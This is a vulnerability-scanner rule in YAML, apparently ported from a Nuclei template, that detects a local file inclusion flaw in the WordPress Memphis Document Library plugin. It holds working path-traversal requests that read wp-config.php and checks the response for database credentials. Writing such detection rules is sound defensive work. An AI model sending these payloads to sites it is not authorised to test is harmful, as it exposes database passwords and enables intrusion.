schema_version: 1
id: "cortex.community:wp-memphis-documents-library-lfi"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "WordPress Memphis Document Library 3.1.5 - Local File Inclusion"
  description: "WordPress Memphis Document Library 3.1.5 is vulnerable to local file inclusion. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://www.exploit-db.com/exploits/39593"
    - "https://wpscan.com/vulnerability/53999c06-05ca-44f1-b713-1e4d6b4a3f9f"
  cwes: [22]
  tags: ["wpscan", "wordpress", "wp-plugin", "lfi", "edb", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/mdocs-posts/?mdocs-img-preview=../../../wp-config.php" }
  - id: "probe1"
    request: { method: "GET", path: "/?mdocs-img-preview=../../../wp-config.php" }
proof:
  kind: "signal.v1"
  assertions:
    any:
      - all:
          - all:
              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "DB_NAME" } }
              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "DB_PASSWORD" } }
          - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
      - all:
          - all:
              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "DB_NAME" } }
              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "DB_PASSWORD" } }
          - eq: { left: { ref: "steps.probe1.status" }, right: { value: 200 } }
